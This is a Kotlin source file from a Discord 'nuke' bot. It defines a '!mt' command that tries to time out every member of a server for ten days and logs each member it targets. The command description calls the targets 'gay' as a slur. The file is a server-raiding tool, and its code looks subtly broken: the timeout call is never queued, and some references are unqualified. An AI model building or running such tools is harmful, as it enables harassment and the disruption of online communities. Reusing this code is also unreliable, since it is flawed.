package thenano.nukebot.bot.command.commands

import net.dv8tion.jda.api.events.message.MessageReceivedEvent
import net.dv8tion.jda.api.exceptions.PermissionException
import thenano.nukebot.bot.command.CommandListener
import thenano.nukebot.bot.command.CommandManager
import java.time.Duration

@CommandListener.Info("!mt","Timeout all gay in this server",false)
class MassTimeOut : CommandListener() {

    override fun onEvent(event: MessageReceivedEvent) {
        if (message.contentRaw.startsWith("!mt")) {
            try {
                event.message.reply("Massing TimeOut").queue()
                for (member in guild.members) {
                    try {
                        guild.timeoutFor(member, Duration.ofDays(10))
                        println("TimeOuted " + member.user.asTag)
                    } catch (e: PermissionException) {
                        println("Cannot timeout " + member.user.asTag + "- PermissionException")
                    }
                    if (CommandManager.stop) break
                }
            } catch (e:PermissionException) {
                message.reply("Permission missing(kick member)").queue()
                message.delete().queue()
            }
        }
    }
}